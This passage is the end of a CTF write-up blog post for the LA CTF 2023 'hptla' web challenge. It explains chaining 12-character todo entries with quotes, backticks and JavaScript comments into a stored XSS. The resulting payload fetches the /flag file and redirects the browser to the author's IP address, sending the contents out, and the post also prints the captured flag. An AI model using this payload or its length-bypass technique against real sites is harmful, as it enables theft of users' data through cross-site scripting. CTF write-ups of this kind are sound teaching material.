</span></span></code></pre></div><p>Here each todo is added to the innerHTML, so there is XSS. But between each todo there as some <code>li</code> elements and we can only add 12 characters in one todo. The flag is in <code>/flag</code> so we have to fetch it from there and then to our site. So the payload will be quite large.</p><h3 id=joining-the-todos class=headerLink><a href=#joining-the-todos class=header-mark></a>Joining the todos</h3><p>So the first thing we have to do is to get rid of the things in between each todo.</p><p>We can start the first todo as <code>&lt;img src='</code> then the next with <code>' onload='</code>. Here we open <code>'</code> on the first todo and close it in the second one. So everything in between will come in the <code>src</code> attribute. Now for the 3rd todo onwards we can give the js payload. But we can&rsquo;t anymore use <code>'</code> to join as it will close off the <code>onload</code> attribute.</p><p>So we went with `, we can put anything in between `. So we have to put one ` at the end of every todo and `; at the start of every todo to close it.</p><p><a class=lightgallery href=images/backticks.png title=backticks data-thumbnail=images/backticks.png><img loading=lazy src=images/backticks.png srcset="images/backticks.png, images/backticks.png 1.5x, images/backticks.png 2x" sizes=auto alt=images/backticks.png></a></p><h3 id=getting-the-flag class=headerLink><a href=#getting-the-flag class=header-mark></a>Getting the flag</h3><p>Now we need to find a way to get the flag and send it to our server and make it short. Our first thought was to use <code>window.open</code> we can just call that using <code>open()</code>
The first 2 characters needed to be `; and the last 2 characters needed to be ;` for the joining to work. So we are left with only 8 characters. With just 8 characters, we can&rsquo;t call <code>open</code> and save it in a variable. So at first, we tried to save <code>open</code> to a variable using <code>o=open</code> and then <code>flag</code> to another variable using <code>f="flag"</code>, then calling <code>w=o(f)</code>. Our payload was</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=o>&lt;</span><span class=nx>img</span> <span class=nx>src</span><span class=o>=</span><span class=s1>&#39;
</span></span></span><span class=line><span class=cl><span class=s1>&#39;</span><span class=nx>onerror</span><span class=o>=</span><span class=s1>&#39;`
</span></span></span><span class=line><span class=cl><span class=s1>`;o=open;`
</span></span></span><span class=line><span class=cl><span class=s1>`;f=&#34;flag&#34;;`
</span></span></span><span class=line><span class=cl><span class=s1>`;w=o(f);&#39;</span>
</span></span></code></pre></div><p>But that failed and give us this error <a href=https://mtsknn.fi/blog/illegal-invocations-in-js/ target=_blank rel="noopener noreferrer">Illegal Invocation</a></p><p><a class=lightgallery href=images/firsterror.png title=firsterror data-thumbnail=images/firsterror.png><img loading=lazy src=images/firsterror.png srcset="images/firsterror.png, images/firsterror.png 1.5x, images/firsterror.png 2x" sizes=auto alt=images/firsterror.png></a></p><p>So we had to use <code>fetch</code>. The main reason why we didn&rsquo;t use <code>fetch</code> in the first place was that it needed either <code>await</code> if we are storing it into a variable or <code>.then()</code> otherwise. Both of them not fitting inside the 12 characters. Now we have to bypass this somehow</p><h3 id=javascript-comments class=headerLink><a href=#javascript-comments class=header-mark></a>Javascript comments</h3><p>We thought <code>backticks</code> was the only way to join queries at first. But then my teammates suggested the idea of using comments <code>/**/</code>. Comments are also more efficient than using ` as we don&rsquo;t need to make each todo as separate lines of code now. We also can separate <code>fetch</code> and <code>.then()</code> by putting comments in between.</p><p><a class=lightgallery href=images/comments.png title=comments data-thumbnail=images/comments.png><img loading=lazy src=images/comments.png srcset="images/comments.png, images/comments.png 1.5x, images/comments.png 2x" sizes=auto alt=images/comments.png></a></p><p><strong>Average Javascript moment</strong> 😎</p><p>Also, we can use comments to separate <code>window</code> and <code>.location</code></p><h3 id=javascript-functions class=headerLink><a href=#javascript-functions class=header-mark></a>Javascript functions</h3><p>Now that we can use <code>.then()</code> we need a function to pass to it. So that&rsquo;s where javascript&rsquo;s arrow functions come to the rescue. We can use that to create 2 functions. We need one to return the <code>r.text()</code> and another one to send the flag to our IP.</p><p>First function</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=sb>`;l=r=&gt;{`</span>
</span></span><span class=line><span class=cl><span class=sb>`;return/*
</span></span></span><span class=line><span class=cl><span class=sb>*/r.text();`</span>
</span></span><span class=line><span class=cl><span class=sb>`;};`</span>
</span></span></code></pre></div><p>Building the second function was a task. At first, we thought of using <code>window.name</code> and redirecting to <code>window.name+r</code> as we can set the <code>window.name</code> from another site while opening a new window. But that didn&rsquo;t work. So we had to give our IP in the payload.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=sb>`;p=q=&gt;{s=/*
</span></span></span><span class=line><span class=cl><span class=sb>*/`</span><span class=nx>http</span><span class=o>:</span><span class=sb>`;`</span>
</span></span><span class=line><span class=cl><span class=sb>`;s+=`</span><span class=c1>//3`;`
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=sb>`;s+=`</span><span class=mf>4.9</span><span class=sb>`;`</span>
</span></span><span class=line><span class=cl><span class=sb>`;s+=`</span><span class=mf>3.5</span><span class=sb>`;`</span>
</span></span><span class=line><span class=cl><span class=sb>`;window./*
</span></span></span><span class=line><span class=cl><span class=sb>*/location/*
</span></span></span><span class=line><span class=cl><span class=sb>*/=s+`</span><span class=mf>6.144</span><span class=o>?</span>
</span></span><span class=line><span class=cl><span class=sb>`+q;};`</span>
</span></span></code></pre></div><p>We also need to assign <code>fetch</code> to a variable as we can&rsquo;t call that with 12 characters.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=sb>`;n=fetch;`</span>
</span></span><span class=line><span class=cl><span class=sb>`;w=n(f)/*
</span></span></span><span class=line><span class=cl><span class=sb>*/.then(l)/*
</span></span></span><span class=line><span class=cl><span class=sb>*/.then(p);&#39;
</span></span></span></code></pre></div><p>Final Payload:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>img</span> <span class=na>src</span><span class=o>=</span><span class=s>&#39;
</span></span></span><span class=line><span class=cl><span class=s>&#39;</span><span class=na>onerror</span><span class=o>=</span><span class=s>&#39;`
</span></span></span><span class=line><span class=cl><span class=s>`;n=fetch;`
</span></span></span><span class=line><span class=cl><span class=s>`;l=r=&gt;{`
</span></span></span><span class=line><span class=cl><span class=s>`;return/*
</span></span></span><span class=line><span class=cl><span class=s>*/r.text();`
</span></span></span><span class=line><span class=cl><span class=s>`;};`
</span></span></span><span class=line><span class=cl><span class=s>`;p=q=&gt;{s=/*
</span></span></span><span class=line><span class=cl><span class=s>*/`http:`;`
</span></span></span><span class=line><span class=cl><span class=s>`;s+=`//3`;`
</span></span></span><span class=line><span class=cl><span class=s>`;s+=`4.9`;`
</span></span></span><span class=line><span class=cl><span class=s>`;s+=`3.5`;`
</span></span></span><span class=line><span class=cl><span class=s>`;window./*
</span></span></span><span class=line><span class=cl><span class=s>*/location/*
</span></span></span><span class=line><span class=cl><span class=s>*/=s+`6.144?
</span></span></span><span class=line><span class=cl><span class=s>`+q;};`
</span></span></span><span class=line><span class=cl><span class=s>`;f=`flag`;`
</span></span></span><span class=line><span class=cl><span class=s>`;w=n(f)/*
</span></span></span><span class=line><span class=cl><span class=s>*/.then(l)/*
</span></span></span><span class=line><span class=cl><span class=s>*/.then(p);&#39;</span>
</span></span></code></pre></div><p><strong>Flag</strong>: <code>lactf{s0_pr0duct1v3_y0u_c4n_3v3n_g3t_xss}</code></p></div><div class=post-footer id=post-footer><div class=post-info><div class=post-info-line><div class=post-info-mod><span>Updated on 2023-02-15</span></div><div class=post-info-license></div></div><div class=post-info-line><div class=post-info-md></div><div class=post-info-share><span><a href=# title="Share on Twitter" data-sharer=twitter data-url=http://r0h1t.me/blog/posts/hptla/ data-title="hptla - LA CTF 2023" data-via=Lu513n data-hashtags=web,lactf23-writeups,ctf,writeup,xss><i class="fab fa-twitter fa-fw"></i></a><a href=# title="Share on Facebook" data-sharer=facebook data-url=http://r0h1t.me/blog/posts/hptla/ data-hashtag=web><i class="fab fa-facebook-square fa-fw"></i></a><a href=# title="Share on Linkedin" data-sharer=linkedin data-url=http://r0h1t.me/blog/posts/hptla/><i class="fab fa-linkedin fa-fw"></i></a><a href=# title="Share on WhatsApp" data-sharer=whatsapp data-url=http://r0h1t.me/blog/posts/hptla/ data-title="hptla - LA CTF 2023" data-web><i class="fab fa-whatsapp fa-fw"></i></a></span></div></div></div><div class=post-info-more><section class=post-tags><i class="fas fa-tags fa-fw"></i>&nbsp;<a href=/blog/tags/web/>web</a>,&nbsp;<a href=/blog/tags/lactf23-writeups/>lactf23-writeups</a>,&nbsp;<a href=/blog/tags/ctf/>ctf</a>,&nbsp;<a href=/blog/tags/writeup/>writeup</a>,&nbsp;<a href=/blog/tags/xss/>xss</a></section><section><span><a href=javascript:void(0); onclick=window.history.back()>Back</a></span>&nbsp;|&nbsp;<span><a href=/blog/>Home</a></span></section></div><div class=post-nav><a href=/blog/posts/queue-up/ class=prev rel=prev title="queue up - LA CTF 2023"><i class="fas fa-angle-left fa-fw"></i>queue up - LA CTF 2023</a></div></div><div id=comments><div id=waline class=comment></div><noscript>Please enable JavaScript to view the comments powered by <a href=https://waline.js.org/>Waline</a>.</noscript></div></article></div></main><footer class=footer><div class=footer-container><div class=footer-line><i class="far fa-copyright fa-fw"></i><span itemprop=copyrightYear>2023</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=http://r0h1t.me/ target=_blank rel="noopener noreferrer">Rohit</a></span></div><div class=footer-line></div><div class=footer-line></div></div></footer></div><div id=fixed-buttons><a href=#back-to-top id=back-to-top-button class=fixed-button title="Back to Top"><i class="fas fa-arrow-up fa-fw"></i>
</a><a href=# id=view-comments class=fixed-button title="View Comments"><i class="fas fa-comment fa-fw"></i></a></div><div class=assets><link rel=stylesheet href=/blog/lib/waline/waline.min.css><script type=text/javascript>window.config={code:{copyTitle:"Copy to clipboard",maxShownLines:10},comment:{waline:{comment:!0,copyright:!0,dark:"body[theme='dark'], body[theme='black']",el:"#waline",lang:"en",pageview:!0,serverURL:"https://r0h1t.me/blog/"}},search:{distance:100,findAllMatches:!0,highlightTag:"em",ignoreFieldNorm:!1,ignoreLocation:!1,isCaseSensitive:!1,location:0,maxResultLength:10,minMatchCharLength:2,noResultsFound:"No results found",snippetLength:30,threshold:.3,useExtendedSearch:!1},sharerjs:!0}</script><script type=text/javascript src=/blog/lib/waline/waline.js defer></script><script type=text/javascript src=/blog/js/waline.min.js defer></script><script type=text/javascript src=/blog/lib/clipboard/clipboard.min.js></script><script type=text/javascript src=/blog/lib/sharer/sharer.min.js></script><script type=text/javascript src=/blog/js/theme.min.js defer></script></div></body></html>